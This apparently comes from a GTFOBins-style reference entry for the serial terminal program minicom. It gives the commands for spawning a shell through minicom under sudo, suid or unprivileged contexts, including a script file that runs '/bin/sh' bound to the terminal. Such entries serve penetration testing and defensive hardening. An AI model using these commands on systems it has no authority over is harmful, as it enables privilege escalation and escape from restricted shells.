title: minicom
html:
minicom

Shell

Context: sudo, suid, unprivileged

minicom -D /dev/null

Context: sudo, suid, unprivileged

echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file
minicom -D /dev/null -S /path/to/temp-file
reset^J
